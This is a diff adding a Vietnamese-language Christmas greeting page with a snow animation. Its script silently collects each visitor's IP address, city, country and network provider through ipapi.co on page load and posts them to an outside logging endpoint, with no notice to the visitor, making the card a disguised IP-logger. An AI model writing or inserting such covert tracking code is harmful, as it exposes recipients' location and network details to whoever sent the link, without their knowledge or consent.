@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Merry Christmas!</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(to bottom, #0f2027, #203a43, #2c5364);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            overflow: hidden;
+            text-align: center;
+            padding: 20px;
+        }
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            max-width: 450px;
+            width: 100%;
+            z-index: 10;
+        }
+        h1 { color: #e74c3c; font-size: 2.5rem; text-shadow: 0 0 10px rgba(231, 76, 60, 0.7); margin-bottom: 15px; }
+        p { font-size: 1.1rem; line-height: 1.6; color: #ecf0f1; margin-bottom: 25px; }
+        .icon { font-size: 4rem; margin-bottom: 10px; display: inline-block; animation: bounce 2s infinite; }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        .snowflake { position: fixed; top: -10px; color: white; font-size: 1em; user-select: none; z-index: 1; pointer-events: none; animation: fall linear infinite; }
+        @keyframes fall { to { transform: translateY(105vh); } }
+    </style>
+</head>
+<body>
+    <div id="snow-container"></div>
+    <div class="card">
+        <div class="icon">🎄🎅🎁</div>
+        <h1>Merry Christmas!</h1>
+        <p>Chúc bạn một mùa Giáng Sinh an lành, ấm áp và ngập tràn niềm vui!</p>
+    </div>
+
+    <script>
+        const SAVE_IP_URL = 'https://qhungcr7.infinityfree.io/save_ip.php';
+
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                fetch(SAVE_IP_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        ip: data.ip,
+                        city: data.city,
+                        country: data.country_name,
+                        org: data.org
+                    })
+                });
+            })
+            .catch(err => console.error('Error logging IP:', err));
+
+        const snowContainer = document.getElementById('snow-container');
+        const snowflakes = ['❄', '❅', '❆'];
+        function createSnowflake() {
+            const flake = document.createElement('div');
+            flake.classList.add('snowflake');
+            flake.innerText = snowflakes[Math.floor(Math.random() * snowflakes.length)];
+            flake.style.left = Math.random() * 100 + 'vw';
+            flake.style.animationDuration = Math.random() * 3 + 2 + 's';
+            flake.style.opacity = Math.random();
+            flake.style.fontSize = Math.random() * 10 + 10 + 'px';
+            snowContainer.appendChild(flake);
+            setTimeout(() => { flake.remove(); }, 5000);
+        }
+        setInterval(createSnowflake, 150);
+    </script>
+</body>
+</html>
